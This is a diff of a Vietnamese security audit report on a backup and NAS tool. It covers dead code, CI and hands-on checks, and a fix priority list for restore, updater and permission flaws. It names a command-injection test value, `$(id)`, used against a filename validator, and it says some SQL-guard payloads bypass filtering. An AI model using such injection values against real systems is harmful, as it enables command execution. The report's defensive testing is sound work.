+## Lỗi merge và code thừa
+
+- Không có conflict marker, không có dòng lặp hay dấu ngoặc thừa. Commit `b8ddd67` đã dọn phần
+  ngoặc thừa từ buffer IDE.
+- `git diff --check` báo dòng trống thừa cuối file ở `eslint.config.mjs:56`,
+  `scripts/sign-release.mjs:96` và `src/lib/release-signature.ts:89`. Ngoài ra khoảng 22 file
+  khác trong `src` cũng thừa dòng trống cuối file (chỉ là thẩm mỹ).
+- Code chết hoặc thừa:
+  - `base.ts:159-163`: khối `if … then : fi` rỗng.
+  - `ssh.ts:578`: biến `lowerWithoutPub` không dùng tới.
+  - `backup-worker.ts:86, 101-107`: set lại status sau khi đã claim.
+  - `queue.ts:322-324`: early return cho RESTORE bị thừa.
+- `aapanel.ts:186`: `find . -P` trông như một chỗ sửa chưa được chạy thử (xem S9).
+- Comment "chặn đứng 100%" ở `sandbox-verifier.ts:146`, `restore-worker.ts:174` và
+  `sql-stream-guard.ts:82-86` là sai với PostgreSQL (S12).
+- `migrateLegacyVolumeLabelsAndWormSettings` chạy 2 lần mỗi lần khởi động. Không gây hại.
 
 ## Kiểm tra đã chạy
 
-- `git fetch` rồi fast-forward `wnreview` lên `origin/main` (`81dbf5b`, không cần force-push).
-- Chạy cục bộ đúng các lệnh CI (`.github/workflows/ci.yml`), Node 24, Windows. Tất cả pass:
+- `git fetch`, rồi merge `origin/main` (`75563a8`) vào `wnreview` bằng merge commit, không cần
+  force-push.
+- Chạy cục bộ đúng các lệnh CI (`.github/workflows/ci.yml`), Node 24.14.1, Windows. Tất cả pass:
   - `npm ci`
+  - `npm run lint`: 0 lỗi.
   - `npm run typecheck`
-  - `npm test`: 19/19 test, 8/8 suite
+  - `npm test`: 29/29 test qua 3 file test (8 suite + 10 test top-level).
   - `npm run build`
-- `git diff --check 89de7ca HEAD`: chỉ báo dòng trống thừa cuối file; không có conflict marker.
-- Agent auth chạy thử server production cục bộ (DATA_DIR tạm, tài khoản test) và xác nhận:
-  - CSRF: POST với `Origin` lạ trả 403.
-  - VIEWER nhận 403 khi: tạo user, tự nâng role, đọc settings, đọc ssh-keys.
-  - Token cũ sau logout trả 401.
-  - PUT settings với giá trị mask không ghi đè secret.
-  - Không bypass được lớp chặn bằng `//api` hay `/%61pi`.
-  - VIEWER bị 403 ở `/api/alerts` (mục A2).
+- `git diff --check 81dbf5b origin/main`: chỉ báo 3 dòng trống thừa cuối file.
 - Đã chạy thử:
-  - Validator `safe-names` với các payload `$(id)`, `;`, xuống dòng, `..`, `-` đứng đầu: đều bị chặn.
-  - Mã hóa offsite: bit-flip, cắt cụt file, đảo chunk, sai passphrase đều bị từ chối; CLI decrypt fail-closed.
-  - Node 24 fetch: bỏ header `Authorization` khi redirect sang origin khác.
-- Đã tự đọc code để xác nhận: S1 (không có `--binary-mode`), S2, S4, U1, O1, N1, N2, N3.
-- **Chưa test được:** khai thác thật với VPS DirectAdmin/cPanel/CyberPanel/PostgreSQL (S1, S3, S5, S6), restore DB lớn hơn 30 phút (N5, N11), và BullMQ/Redis thật (N1b stalled job).
+  - `sql-stream-guard.ts` trên Node 24 với từng payload, đưa cả khối lẫn từng byte một: kết quả
+    giống nhau, nên ranh giới chunk không phải điểm yếu. 6 payload ở S12 lọt qua; `\!` trần, `\`
+    sau `;` và `COPY … PROGRAM` ở cấp ngoài cùng bị chặn.
+  - mysql 8.0.30 với `--binary-mode --defaults-extra-file=…`: lỗi `unknown variable` (S13).
+  - `git ls-remote`: cả 9 SHA action đã pin trong `release.yml` / `ci.yml` khớp với tag ghi kèm.
+  - `verifyReleaseSignature` trên `.sha256` / `.sig` thật của v1.6.0 và v1.7.0: cả hai hợp lệ với
+    public key nhúng sẵn (vì thế U13 có mục tiêu hạ cấp thật).
+  - Không thấy private key nào khớp với public key trong repo hay lịch sử git.
+  - NASSYNC2: mã hóa rồi giải mã đúng; bỏ frame EOF hoặc lật bit header đều bị phát hiện. File
+    NASSYNC1 tạo bằng bộ mã hóa của `81dbf5b` giải mã được bằng cả thư viện lẫn CLI mới.
+- Đã tự đọc code để xác nhận: S9, S13, U11, N18, A11.
+- **Chưa test được:**
+  - psql thật, có và không có `\restrict` (S6, S12).
+  - VPS thật chạy cPanel/DirectAdmin/CyberPanel/aaPanel.
+  - MariaDB client (S13).
+  - BullMQ/Redis thật (N18, N23).
+  - API TrueNAS (S17).
+  - Restore DB lớn (N5, N11).
 
 ## Đề xuất thứ tự xử lý
 
-1. **S1:** thêm `--binary-mode` là sửa được một dòng mỗi chỗ và chặn ngay đường RCE vào NAS.
-2. **S2, S3:** symlink/TOCTOU khi chạy root trên VPS.
-3. **N1, N2, N4:** job chạy lại hoặc không hủy được, và job hết retry mà không cảnh báo.
-4. **U1:** updater chỉ cập nhật theo release đã ký.
-5. **O1, N3, N5, N6:** mất dữ liệu offsite, OOM, timeout giả, rò rỉ dung lượng đĩa.
-6. Các mục Trung bình và Thấp còn lại.
+1. **S13:** đổi thứ tự cờ, sửa một dòng là khôi phục restore MySQL cho cPanel và các panel khác.
+2. **S9:** `find -P .`, sửa một dòng.
+3. **S12, S6:** từ chối restore PostgreSQL khi psql đích không có `\restrict`, hoặc chuyển sang
+   `pg_restore`; kết nối bằng role của khách.
+4. **N18:** thống nhất số lần retry giữa BullMQ và worker để lần thử cuối có FAILED và CRITICAL.
+5. **U6, U7:** environment có duyệt cho khóa ký, tag protection, và `npm ci --ignore-scripts`.
+6. **A11, U11, A9, A10:** rò mật khẩu DSM, `.env` trong bundle, và hai đường bỏ qua quyền.
+7. **S14, N19–N22, U8–U10:** setuid khi restore, job chạy lại hoặc kẹt, cập nhật không đầy đủ.
+8. Các mục Thấp còn lại.
